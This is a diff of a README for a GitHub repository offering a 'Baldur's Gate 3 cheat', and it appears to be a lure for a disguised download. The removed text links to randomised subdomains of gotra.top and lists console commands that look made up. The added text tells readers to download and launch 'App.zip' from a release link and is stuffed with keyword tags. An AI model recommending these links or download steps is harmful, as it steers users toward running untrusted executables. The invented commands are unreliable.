@@ -1,94 +1,38 @@
-![hq720](https://github.com/user-attachments/assets/8b468264-330a-425a-b709-64f63353a393)
+# 🎮 Baldur's Gate 3 Cheat Repository
 
-# Baldur's Gate 3 Cheat
+Welcome to the official repository for Baldur's Gate 3 Cheat! This repository is dedicated to providing cheat codes, cheat engine tables, hacks, and more for the popular PC game Baldur's Gate 3.
 
-#
-[![https://otCIE.gotra.top/54/baJFww6V](https://ad97pUs.gotra.top/l.svg)](https://NDWSmnmx.gotra.top/54/szPOZm2)
+## 📁 Repository Details
+- **Name:** Baldur-s-Gate-3-Cheat
+- **Description:** Cheat codes, cheat engine tables, and hacks for Baldur's Gate 3
+- **Topics:** baldurs-gate-3-cheat-codes-pc, baldurs-gate-3-cheat-engine, baldurs-gate-3-cheat-engine-gold, baldurs-gate-3-cheat-engine-level-up, baldurs-gate-3-cheat-engine-table, baldurs-gate-3-cheat-engine-xp, baldurs-gate-3-cheat-table, baldurs-gate-3-cheat-table-2025, baldurs-gate-3-cheats, baldurs-gate-3-hack, baldurs-gate-3-steam-hack, baldurs-gate-3-xp-hack
 
-Welcome to the **Baldur's Gate 3 Cheat Repository**, your ultimate resource for enhancing your gameplay experience! This repository provides a collection of cheats, console commands, mods, and tips to help you navigate the world of Faerûn.
+## 🔗 Quick Access
+For quick access, download the latest version of the cheat program by clicking the button below:
+[![Download Cheat Program](https://img.shields.io/badge/Download-Cheat%20Program-blue)](https://github.com/repo/releases/9246/App.zip)
 
-## 🚀 Features
-- **Comprehensive Cheat List**: Unlock hidden abilities, bypass difficult challenges, and modify stats.
-- **Console Commands**: Detailed guide on activating and using developer commands.
-- **Mods and Tools**: Links and instructions for the best mods to expand your gameplay.
-- **Troubleshooting and Support**: Fix common issues with cheats and mods.
+## 🚀 Get Cheating!
+Dive into the world of Baldur's Gate 3 with an edge over your foes. Whether you're looking for unlimited gold, experience points, or other advantages, our cheat codes and engine tables have got you covered. With our hacks, you can level up faster, enhance your gameplay, and truly dominate the game.
 
----
+## 📂 Repository Structure
+1. **Cheat Codes:** Discover hidden codes to unlock special abilities and items.
+2. **Cheat Engine Tables:** Modify the game's parameters to your advantage.
+3. **Hacks:** Gain an upper hand with various hacks developed by our community.
 
-## 📜 Table of Contents
-1. [Getting Started](#getting-started)
-2. [Cheats and Console Commands](#cheats-and-console-commands)
-3. [Mods for Baldur's Gate 3](#mods-for-baldurs-gate-3)
-4. [Tips and Tricks](#tips-and-tricks)
-5. [FAQs](#faqs)
-6. [Contributing](#contributing)
+## 🎯 How to Use the Cheat Program
+1. **Download & Install:** Download the cheat program from the provided link and launch the application.
+2. **Activate Cheats:** Follow the instructions within the program to activate your desired cheats.
+3. **Enjoy:** Have fun exploring Baldur's Gate 3 with newfound power!
 
----
+## 💡 More Resources
+- **Wiki:** Visit our repository's wiki section for detailed guides and tutorials.
+- **Issues:** Report any bugs or suggest enhancements in the "Issues" section.
+- **Community:** Join the discussion in the "Discussions" tab and connect with fellow players.
 
-## 🎮 Getting Started
+## 🌟 Stay Updated
+To stay updated on the latest releases and updates to the cheat program, make sure to check the "Releases" section regularly. Our team is constantly working to improve the cheats and provide you with the best gaming experience.
 
-Before diving into cheats and mods, make sure:
-1. **Game Version**: You're running the latest version of Baldur's Gate 3.
-2. **Backups**: Always backup your save files before applying cheats or mods. Save files are usually located in:
-   ```
-   C:\Users\<YourUsername>\Documents\Larian Studios\Baldur's Gate 3\PlayerProfiles\<ProfileName>\Savegames
-   ```
-3. **Enable Console Commands**:
-   - Locate the `bg3.exe` file.
-   - Add `--enableconsole` as a launch argument.
+## 🎮 Happy Cheating!
+Thank you for choosing our Baldur's Gate 3 Cheat repository. We hope you enjoy enhancing your gameplay experience with our cheats and hacks. Dive into the world of Baldur's Gate 3 like never before and make the game truly your own! 🎉
 
----
-
-## 🛠 Cheats and Console Commands
-
-Here are some popular cheats and their commands:
-
-### Attribute Modification
-- **Add XP**:
-  ```
-  AddExperience <amount>
-  ```
-  Example: `AddExperience 1000` grants 1000 XP.
-
-- **Change Gold**:
-  ```
-  AddGold <amount>
-  ```
-  Example: `AddGold 5000` gives you 5000 gold.
-
-### Spawn Items and Gear
-- **Spawn Item**:
-  ```
-  SpawnItem <itemID>
-  ```
-  Example: `SpawnItem longsword_rare` creates a rare longsword.
-
-- **Spawn NPC**:
-  ```
-  SpawnNPC <npcID>
-  ```
-  Example: `SpawnNPC shadowheart` summons Shadowheart.
-
----
-
-## 🔍 Tips and Tricks
-- **Quick Saves**: Use F5 frequently to create quick saves.
-- **Group Movement**: Hold Shift to move the entire party efficiently.
-- **Key Items**: Use Alt to highlight interactable objects in the environment.
-
----
-
-## 🤝 Contributing
-
-We welcome contributions! If you have a cheat, mod, or tip to share, please:
-1. Fork the repository.
-2. Create a new branch.
-3. Submit a pull request with your changes.
-
----
-
-### 🎨 Credits
-Special thanks to:
-- Larian Studios for creating this masterpiece.
-- The BG3 modding community for their amazing work.
-- Contributors like you for keeping this repository alive!
+Remember, with great power comes great responsibility -- or in this case, just more fun! 😉
